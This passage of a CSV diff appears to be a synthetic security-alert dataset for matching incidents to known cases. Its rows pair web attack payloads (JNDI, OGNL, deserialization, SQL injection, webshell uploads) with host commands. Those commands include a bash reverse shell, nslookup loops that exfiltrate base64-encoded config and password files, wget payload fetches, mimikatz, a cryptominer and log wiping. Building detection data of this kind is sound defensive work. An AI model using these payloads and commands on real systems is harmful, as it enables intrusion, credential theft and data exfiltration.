@@ -1,0 +1,537 @@
+﻿序号,内容,检索结果,案例性质
+1001,"/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
+/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
+https://app-java-152.ops-corp.com/api/v2/login {""jndi"": ""ldap://10.20.7.31:1389""} Mozilla/5.0 (Windows NT 10.0
+uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/app/auth-service.jar","CASE-001(strong,3/3)",精确重复:CASE-001
+1002,"/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N
+/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N
+https://app-spring-27.ops-corp.com/submit {""property"": ""classLoader.first""} Mozilla/5.0 (Windows NT 11.0; Win6
+whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== /usr/local/tomcat/bin/catalina.sh","CASE-002(keyword_only,0/4)",新案例
+1003,"/actuator/gateway {""name"":""RewritePath"",""args"":{""_genkey_0"":""#{T(java.lang.Runtime)}""}} Mozilla/5.0 (X11; Linu
+/actuator/gateway {""name"":""RewritePath"",""args"":{""_genkey_0"":""#{T(java.lang.Runtime)}""}} Mozilla/5.0 (X11; Linu
+https://app-spring-95.ops-corp.com/actuator/gateway {""spel"": ""#{T(java.lang.Runtime)}""} Mozilla/5.0 (X11; Linu
+ssh -o StrictHostKeyChecking=no -i /tmp/.k root@10.20.4.23 id ssh ssh -o StrictHostKeyChecking=no -i /tmp/.k <",,新案例
+1004,"/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh
+/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh
+https://app-java-88.ops-corp.com/pages/doenterpagevariables.action {""ognl"": ""exec""} Mozilla/5.0 (Macintosh; In
+id /usr/bin/id id <== /bin/sh -c 'id' <== /opt/atlassian/confluence/bin/catalina.sh","CASE-002(keyword_only,0/4)",新案例
+1005,"/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0
+/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0
+https://app-tomcat-71.ops-corp.com/user/login.action {""ognl"": ""(#cmd='id')""} Mozilla/5.0 (Windows NT 10.0; Win
+id;hostname /usr/bin/id id;hostname <== /bin/sh -c 'id;hostname' <== /usr/local/tomcat/bin/catalina.sh","CASE-002(weak,1/4)",新案例
+1006,"/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1
+/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1
+https://app-java-41.ops-corp.com/bea_wls_internal/T3 {""t3"": ""rO0ABXNyABFqYXZh""} Mozilla/5.0 (Linux; Android 14
+nohup /tmp/.w -d <== /bin/sh -c 'nohup /tmp/.w -d' <== java -Dweblogic.Name=AdminServer weblogic.Server",,新案例
+1007,"/api/user/profile {""@type"":""com.sun.rowset.JdbcRowSetImpl"",""url"":""ldap://10.20.7.31""} Mozilla/5.0 (iPhone; CPU
+/api/user/profile {""@type"":""com.sun.rowset.JdbcRowSetImpl"",""url"":""ldap://10.20.7.31""} Mozilla/5.0 (iPhone; CPU
+https://app-java-119.ops-corp.com/api/user/profile {""autoType"": ""JdbcRowSetImpl""} Mozilla/5.0 (iPhone; CPU iPh
+touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar","CASE-001(weak,1/3)",同族变体:CASE-001
+1008,"/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S
+/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S
+https://app-java-76.ops-corp.com/webtools/control/xmlrpc {""deserialization"": ""rO0ABXNy""} Mozilla/5.0 (Linux; A
+env /usr/bin/env env <== /bin/sh -c 'env' <== /usr/bin/java -jar /opt/app/ofbiz.jar","CASE-001(weak,1/3)",新案例
+1009,"/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;
+/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;
+https://app-java-63.ops-corp.com/solr/core1/select {""template"": ""velocity""} Mozilla/5.0 (Windows NT 10.0; Win6
+sh /tmp/.v <== /bin/sh -c 'sh /tmp/.v' <== /usr/bin/java -jar /opt/solr/server/start.jar","CASE-001(weak,1/3)",新案例
+1010,"/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3
+/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3
+https://app-java-134.ops-corp.com/cli {""file_read"": ""@/etc/passwd"", ""cli"": ""help""} Mozilla/5.0 (Windows NT 11.
+cat /var/lib/jenkins/config.xml <== /bin/sh -c 'cat config.xml' <== java -jar /opt/app/jenkins.war","CASE-001(weak,1/3)",新案例
+1011,"/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
+/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
+https://app-php-44.ops-corp.com/index.php {""path_traversal"": ""%252e%252e%252f""} Mozilla/5.0 (X11; Linux x86_64
+cat /etc/shadow /usr/bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== php-fpm: pool www","CASE-004(keyword_only,0/4)",新案例
+1012,"/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
+/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
+https://app-php-118.ops-corp.com/index.php {""fpm_newline"": ""auto_prepend""} Mozilla/5.0 (Macintosh; Intel Mac O
+wget -qO /tmp/.f 10.20.5.77/f <== /bin/sh -c 'wget -qO /tmp/.f 10.20.5.77/f' <== php-fpm: pool www","CASE-004(keyword_only,0/4)",新案例
+1013,"/_ignition {""solution"":""MakeViewVariableOptionalSolution"",""viewFile"":""phar:///tmp""} Mozilla/5.0 (Windows NT 10
+/_ignition {""solution"":""MakeViewVariableOptionalSolution"",""viewFile"":""phar:///tmp""} Mozilla/5.0 (Windows NT 10
+https://app-php-156.ops-corp.com/_ignition {""deserialization"": ""phar://""} Mozilla/5.0 (Windows NT 10.0; Win64;
+printf PD9waHAgPz4= > /var/www/html/i.php <== /bin/sh -c 'printf PD9waHAgPz4=' <== php-fpm: pool www","CASE-004(weak,0/4)",同族变体:CASE-004
+1014,"/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14
+/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14
+https://app-php-83.ops-corp.com/index.php {""invokefunction"": ""call_user_func_array""} Mozilla/5.0 (Linux; Andro
+ls -la /var/www/html <== /bin/sh -c 'ls -la /var/www/html' <== php-fpm: pool www","CASE-004(keyword_only,0/4)",新案例
+1015,"/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU
+/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU
+https://app-node-62.ops-corp.com/api/v1/render {""binding"": ""spawn_sync"", ""escape"": ""vm""} Mozilla/5.0 (iPhone; 
+bash -i >& /dev/tcp/10.20.7.31/9001 0>&1 <== /bin/sh -c 'bash -i' <== /usr/bin/node /opt/app/render.js",,新案例
+1016,"/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew
+/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew
+https://app-node-149.ops-corp.com/api/avatar {""ssrf"": ""169.254.169.254"", ""bypass"": ""x-middleware-subrequest""} 
+curl 169.254.169.254/latest <== /bin/sh -c 'curl 169.254.169.254' <== /usr/bin/node /opt/app/server.js",,新案例
+1017,"/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+https://app-go-109.ops-corp.com/public/plugins/alertlist/ {""traversal"": ""etc/grafana.db""} Mozilla/5.0 (Windows
+cat /etc/grafana/grafana.ini <== /bin/sh -c 'cat /etc/grafana/grafana.ini' <== grafana-server",,新案例
+1018,"/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi
+/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi
+https://app-spring-2.ops-corp.com/h2-console/login.do {""jndi"": ""ldap://10.20.5.19""} Mozilla/5.0 (Windows NT 11
+chmod +x /tmp/.h2 <== /bin/sh -c 'chmod +x /tmp/.h2' <== /usr/bin/java -jar /opt/app/admin.jar","CASE-001(weak,2/3)",同族变体:CASE-001
+1019,"/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53
+/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53
+https://app-django-187.ops-corp.com/report/export {""sqli"": ""cast_error"", ""engine"": ""postgres""} Mozilla/5.0 (X1
+cat /opt/app/settings.py <== /bin/sh -c 'cat /opt/app/settings.py' <== /usr/bin/python3 /opt/app/manage.py",,新案例
+1020,"/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M
+/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M
+https://app-rails-55.ops-corp.com/api/v3/session {""deserialization"": ""Marshal""} Mozilla/5.0 (Macintosh; Intel 
+echo @reboot /tmp/.r>>/var/spool/cron/root <== /bin/sh -c 'echo @reboot /tmp/.r' <== ruby /opt/app/bin/rails","CASE-004(weak,1/4)",新案例
+1021,"/uploads/cmd.jsp/ PUT <%@ page import=""java.util.*""%><% Runtime.getRuntime().exec(""id"")%> Mozilla/5.0 (Windows
+/uploads/cmd.jsp/ PUT <%@ page import=""java.util.*""%><% Runtime.getRuntime().exec(""id"")%> Mozilla/5.0 (Windows
+https://app-tomcat-77.ops-corp.com/uploads/cmd.jsp/ {""upload"": ""cmd.jsp"", ""rce"": ""exec""} Mozilla/5.0 (Windows 
+id; hostname /usr/bin/id id; hostname <== /bin/sh -c 'id; hostname' <== /usr/local/tomcat/bin/catalina.sh
+a16f2990.vqmxld-2b71.net A 10.10.23.180
+ae823f83.vqmxld-2b71.net A 10.10.36.219
+af0c3d5f.vqmxld-2b71.net A 203.0.113.109","CASE-002(strong,4/4)",精确重复:CASE-002
+1022,"/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0
+/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0
+https://app-java-24.ops-corp.com/HtmlAdaptor {""mbean"": ""MLet"", ""invoke"": ""jboss.admin""} Mozilla/5.0 (Windows N
+uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/jboss/jboss-modules.jar
+3b977a87.rjbhpu-88ca.com A 10.10.28.152
+4a67dbcb.rjbhpu-88ca.com A 198.51.100.46
+f9f1043a.rjbhpu-88ca.com A 10.10.40.116","CASE-001(weak,1/3)",新案例
+1023,"/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0
+/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0
+https://app-java-61.ops-corp.com/axis2-admin/upload {""upload"": ""evil.aar"", ""svc"": ""axis""} Mozilla/5.0 (Windows
+echo /tmp/.svc>>/etc/rc.local sh sh -c 'echo /tmp/.svc>>/etc/rc.local' <== java -jar axis2.jar
+29134fe9.wtzsgn-4e0d.org A 192.0.2.33
+6eb53daa.wtzsgn-4e0d.org A 10.10.32.6
+cc7d986e.wtzsgn-4e0d.org A 10.10.41.180","CASE-002(weak,1/4)",新案例
+1024,"/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte
+/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte
+https://app-iis-33.ops-corp.com/ueditor/net/controller.ashx {""upload"": ""catchimage""} Mozilla/5.0 (Macintosh; I
+wmic /node:10.20.3.71 process call create ""cmd.exe /c whoami"" cmd.exe cmd.exe /c wmic /node:10.20.3.71 proc pr
+aa671fef.flyqkd-7a35.io A 192.0.2.35
+f5f06add.flyqkd-7a35.io A 10.10.25.160
+22f4ad3d.flyqkd-7a35.io A 10.10.29.38","CASE-002(weak,1/4)",新案例
+1025,"/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK
+/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK
+https://app-spring-118.ops-corp.com/actuator/heapdump {""heapdump"": ""creds_in_mem""} Mozilla/5.0 (X11; Linux x86
+for l in $(strings /tmp/h.hprof|base64|fold -w30); do nslookup $l.qzrthm-4a17.net; done strings strings for fo
+d3cfbf5f.qzrthm-4a17.net A 10.10.24.224
+9fe3bf96.qzrthm-4a17.net A 192.0.2.141
+8f883773.qzrthm-4a17.net A 10.10.30.66","CASE-002(weak,1/4)",新案例
+1026,"/wls-wsat/CoordinatorPortType <WorkContext xmlns=""http://bea.com/2004/06/soap/workarea/""> Mozilla/5.0 (Linux; 
+/wls-wsat/CoordinatorPortType <WorkContext xmlns=""http://bea.com/2004/06/soap/workarea/""> Mozilla/5.0 (Linux; 
+https://app-java-204.ops-corp.com/wls-wsat/CoordinatorPortType {""xml"": ""ProcessBuilder""} Mozilla/5.0 (Linux; A
+cat /etc/shadow /bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== java weblogic.Server
+7881b511.bpsxjv-c930.com A 10.10.47.140
+f7e9d64d.bpsxjv-c930.com A 203.0.113.148
+e946294b.bpsxjv-c930.com A 10.10.37.60","CASE-002(weak,1/4)",新案例
+1027,"/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[""/bin/sh"",""id""] Mozilla/5.0 (iPhone; C
+/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[""/bin/sh"",""id""] Mozilla/5.0 (iPhone; C
+https://app-spring-9.ops-corp.com/nacos/v1/cs/configs {""jwt"": ""nacos_default_secret""} Mozilla/5.0 (iPhone; CPU
+for l in $(cat /home/nacos/conf/cluster.conf|base64|fold -w30); do nslookup $l.mnwcug-15ef.org; done for for l
+c0e41548.mnwcug-15ef.org A 10.10.33.97
+fe3f939c.mnwcug-15ef.org A 198.51.100.48
+885dd9ec.mnwcug-15ef.org A 10.10.39.75","CASE-002(weak,1/4)",新案例
+1028,"/api/ds/query POST {""queries"":[{""expr"":""SELECT 1; COPY (SELECT '') TO PROGRAM 'id'""}]} Mozilla/5.0 (Linux; And
+/api/ds/query POST {""queries"":[{""expr"":""SELECT 1; COPY (SELECT '') TO PROGRAM 'id'""}]} Mozilla/5.0 (Linux; And
+https://app-go-14.ops-corp.com/api/ds/query {""sql_expr"": ""COPY TO PROGRAM"", ""cmd"": ""id""} Mozilla/5.0 (Linux; A
+ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== /usr/sbin/grafana-server
+205e79ac.khdtqe-6b28.io A 10.10.42.98
+6caf7104.khdtqe-6b28.io A 192.0.2.128
+796562f0.khdtqe-6b28.io A 10.10.48.72","CASE-002(weak,1/4)",新案例
+1029,"/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10
+/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10
+https://app-java-43.ops-corp.com/api/userService {""hessian"": ""rO0ABXNyABFqYXZh""} Mozilla/5.0 (Windows NT 10.0;
+for l in $(cat /opt/dubbo/conf/dubbo.properties|base64|fold -w30); do nslookup $l.prsloy-0d4c.net; done for fo
+56a78f02.prsloy-0d4c.net A 10.10.38.144
+f33b31fd.prsloy-0d4c.net A 10.10.39.235
+118fa038.prsloy-0d4c.net A 198.51.100.50","CASE-002(weak,1/4)",新案例
+1030,"/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl
+/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl
+https://app-java-171.ops-corp.com/scriptText {""script_console"": ""groovy"", ""cmd"": ""id""} Mozilla/5.0 (Windows NT
+cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== java -jar jenkins.war
+9d727469.xtfwnj-ae63.com A 198.51.100.32
+9c1d2627.xtfwnj-ae63.com A 10.10.35.54
+f634301b.xtfwnj-ae63.com A 10.10.33.23","CASE-001(weak,1/3)",新案例
+1031,"/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(""id"") Mozilla/5.0 (Windows NT 10.0; 
+/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(""id"") Mozilla/5.0 (Windows NT 10.0; 
+https://app-python-55.ops-corp.com/dags/upload {""dag_bag"": ""pickle"", ""cmd"": ""os.system""} Mozilla/5.0 (Windows 
+for l in $(grep -i pass /opt/airflow/airflow.cfg|base64|fold -w30); do nslookup $l.glmbcr-39d7.org; done for f
+947e7e61.glmbcr-39d7.org A 203.0.113.63
+2f900c57.glmbcr-39d7.org A 10.10.42.115
+33caf0ce.glmbcr-39d7.org A 10.10.25.107","CASE-002(weak,1/4)",新案例
+1032,"/api/setup/validate {""db"":""h2"",""init"":""RUNSCRIPT FROM 'http://10.20.5.19/x.sql'""} Mozilla/5.0 (Macintosh; Inte
+/api/setup/validate {""db"":""h2"",""init"":""RUNSCRIPT FROM 'http://10.20.5.19/x.sql'""} Mozilla/5.0 (Macintosh; Inte
+https://app-java-190.ops-corp.com/api/setup/validate {""h2_init"": ""RUNSCRIPT""} Mozilla/5.0 (Macintosh; Intel Ma
+id -a /usr/bin/id id -a <== /bin/sh -c 'id -a' <== /usr/bin/java -jar metabase.jar
+9c49ebe3.djqkps-f2a0.io A 10.10.33.65
+0e038dd9.djqkps-f2a0.io A 10.10.24.43
+b908e184.djqkps-f2a0.io A 192.0.2.91","CASE-001(weak,1/3)",新案例
+1033,"/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64
+/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64
+https://app-php-27.ops-corp.com/user/register {""post_render"": ""exec"", ""php"": ""markup""} Mozilla/5.0 (X11; Linux
+for l in $(base64 /var/www/html/sites/default/settings.php|fold -w30); do nslookup $l.ynvtkh-8c15.net; done fo
+442ffe88.ynvtkh-8c15.net A 192.0.2.55
+9beee1b0.ynvtkh-8c15.net A 10.10.29.198
+98ea0696.ynvtkh-8c15.net A 10.10.28.42","CASE-002(weak,1/4)",新案例
+1034,"/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A
+/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A
+https://app-java-66.ops-corp.com/setup/setupadministrator.action {""setup_bypass"": true} Mozilla/5.0 (Linux; An
+whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== java -jar confluence.jar
+1efb0869.czwlbd-5e72.com A 10.10.37.77
+d51fe8ad.czwlbd-5e72.com A 203.0.113.44
+cefdb1bf.czwlbd-5e72.com A 10.10.24.182","CASE-001(weak,1/3)",新案例
+1035,"/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;
+/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;
+https://app-iis-7.ops-corp.com/autodiscover/autodiscover.json?@a.com/ {""ssrf"": ""adc""} Mozilla/5.0 (iPhone; CPU
+wmic /node:10.20.3.44 process call create ""cmd.exe /c powershell -enc SQBFAFgA"" cmd.exe cmd.exe /c wmic <== se
+5d0d7221.srpmfx-b146.org A 10.10.39.46
+7f1cf47f.srpmfx-b146.org A 10.10.29.52
+bfe3dd82.srpmfx-b146.org A 192.0.2.141","CASE-008(weak,1/6)",同族变体:CASE-008
+1036,"/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata ""\c${system('id')};"") Mozilla/5.0 (Linux; Android 13;
+/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata ""\c${system('id')};"") Mozilla/5.0 (Linux; Android 13;
+https://app-rails-34.ops-corp.com/api/v4/projects/4/uploads {""exiftool"": ""DjVu""} Mozilla/5.0 (Linux; Android 1
+for l in $(cat /etc/gitlab/gitlab-secrets.json|base64|fold -w30); do nslookup $l.hgwqnk-93da.io; done for for 
+451b09e5.hgwqnk-93da.io A 10.10.34.233
+8ba73280.hgwqnk-93da.io A 192.0.2.43
+94b12761.hgwqnk-93da.io A 10.10.40.28","CASE-002(weak,1/4)",新案例
+1037,"/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10
+/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10
+https://app-php-84.ops-corp.com/zabbix.php {""sqli"": ""auditlog.list"", ""param"": ""userid""} Mozilla/5.0 (Windows N
+for l in $(mysql -e ""select passwd from users"" zabbix|base64|fold -w30); do nslookup $l.lvctzj-7f4e.net; done 
+d8726c49.lvctzj-7f4e.net A 10.10.37.184
+f4927a6d.lvctzj-7f4e.net A 198.51.100.70
+5c38abd8.lvctzj-7f4e.net A 10.10.38.122","CASE-002(weak,1/4)",新案例
+1038,"/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree ""\\5f71a2c4.tbnxmu-2c8b.com\a"" Mozilla/5.0 (Windows NT 11.0;
+/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree ""\\5f71a2c4.tbnxmu-2c8b.com\a"" Mozilla/5.0 (Windows NT 11.0;
+https://app-php-121.ops-corp.com/api/v1/report?id=1 {""xp_dirtree"": true, ""oob"": ""dns""} Mozilla/5.0 (Windows NT
+ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.6.88 ""mysqldump -uroot app|gzip -c"" ssh <== /usr/sbin/
+353ab2b4.tbnxmu-2c8b.com A 10.10.41.111
+415e2098.tbnxmu-2c8b.com A 10.10.35.191
+bc793874.tbnxmu-2c8b.com A 203.0.113.49","CASE-002(weak,1/4)",新案例
+1039,"/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT
+/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT
+https://app-java-202.ops-corp.com/api/v1/soap/endpoint {""xxe"": ""ext_entity""} Mozilla/5.0 (Windows NT 10.0; Win
+cat /etc/hostname /bin/cat cat /etc/hostname <== /bin/sh -c 'cat /etc/hostname' <== java -jar /opt/app/api.jar
+e10b4d76.kqwyvs-6a03.org A 203.0.113.123
+078390f8.kqwyvs-6a03.org A 10.10.47.6
+4ec37f43.kqwyvs-6a03.org A 10.10.39.86","CASE-001(weak,1/3)",新案例
+1040,"/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
+/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
+https://app-java-143.ops-corp.com/api/v1/import {""xstream"": ""dynamic-proxy""} Mozilla/5.0 (Macintosh; Intel Mac
+for l in $(cat /opt/app/config/application.yml|base64|fold -w30); do nslookup $l.pfdrmt-e598.io; done for for 
+4b6843de.pfdrmt-e598.io A 10.10.41.133
+f69b72c1.pfdrmt-e598.io A 10.10.35.105
+1a1af427.pfdrmt-e598.io A 192.0.2.29","CASE-002(weak,1/4)",新案例
+1041,"mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" mimikatz.exe cmd.exe /c C:\Windows\Temp\m.exe <== /",,新案例
+1042,"/api/v1/scheduler/run cmd=schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe Mozilla/5.0 (Win
+https://app-tomcat-47.ops-corp.com/api/v1/scheduler/run {""cmd_inject"": ""schtasks /create /sc minute"", ""sched_t
+schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe schtasks.exe java.exe -jar C:\svc\gw.jar <","CASE-003(strong,3/3)",精确重复:CASE-003
+1043,sc create SmSvc binPath= C:\Windows\Temp\svc.exe start= auto sc.exe cmd.exe /c sc create SmSvc binPath= C:\Win,"CASE-008(weak,1/6)",新案例
+1044,bash -i >& /dev/tcp/10.20.5.19/8443 0>&1 /bin/bash bash -i <== /bin/sh -c 'bash -i' <== nginx: worker process,,新案例
+1045,xmrig -o stratum+tcp://10.20.5.77:3333 -u 4ANf8kQ -p x xmrig xmrig <== /bin/sh -c '/tmp/.kr/xmrig -o st',,新案例
+1046,"/backup/export src=../../etc/shadow&dst=/tmp/.cache.tgz Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KH
+tar czf /tmp/.cache /etc/shadow /etc/passwd tar czf /tmp/.cache <== /bin/sh -c 'tar' <== nginx: worker process",,新案例
+1047,wevtutil cl Security && vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c wevtutil cl Security && vss <==,"CASE-005(weak,1/3)",同族变体:CASE-005
+1048,"https://app-tomcat-38.ops-corp.com/uploads/shell.jsp {""webshell"": ""shell.jsp"", ""cmd"": ""id""} Mozilla/5.0 (Windo
+id /usr/bin/id id <== /bin/sh -c 'id' <== /usr/local/tomcat/bin/catalina.sh","CASE-002(keyword_only,0/4)",同族变体:CASE-002
+1049,"https://app-php-92.ops-corp.com/uploads/up.php {""upload"": ""shell.php"", ""act"": ""upload""} Mozilla/5.0 (Macintosh
+mv /tmp/php3f2a.tmp /var/www/html/shell.php /bin/mv mv <== /bin/sh -c 'mv /tmp/php3f' <== php-fpm: pool www","CASE-005(weak,1/3)",同族变体
+1050,"https://app-iis-20.ops-corp.com/upload/cmd.aspx {""webshell"": ""cmd.aspx"", ""cmd"": ""whoami""} Mozilla/5.0 (Windows
+whoami /all C:\Windows\System32\whoami.exe whoami /all <== cmd.exe /c whoami /all <== w3wp.exe -ap ""DefaultApp","CASE-008(keyword_only,0/6)",同族变体
+1051,"https://app-spring-18.ops-corp.com/api/v1/upload/gateway {""cmd"": ""id;whoami"", ""payload_enc"": ""base64-aes""} Moz
+id;whoami /bin/bash id;whoami <== /bin/sh -c 'id;whoami' <== java -jar /opt/app/gw.jar","CASE-001(weak,1/3)",新案例
+1052,"https://app-go-27.ops-corp.com/api/v1/convert {""cmd_inject"": ""|id"", ""lang"": ""go""} Mozilla/5.0 (X11; Linux x86_
+cat /etc/hosts /bin/cat cat /etc/hosts <== /bin/sh -c 'cat /etc/hosts' <== /opt/app/apiserver","CASE-003(keyword_only,0/3)",新案例
+1053,"/api/v2/proxy/exec ip=10.20.3.14;id;cat /etc/hostname Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537
+https://app-go-64.ops-corp.com/api/v2/proxy/exec {""cmd_inject"": "";id;cat /etc/hostname"", ""gw"": true} Mozilla/5
+curl -sS http://10.20.6.88:8080/api/v1/users /usr/bin/curl curl -sS <== /bin/sh -c 'curl' <== api-gw","CASE-003(keyword_only,0/3)",新案例
+1054,"/grpc.gateway.Exec/Start 1:{""cmd"":""x;id;uname -a""} 5:true Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS 
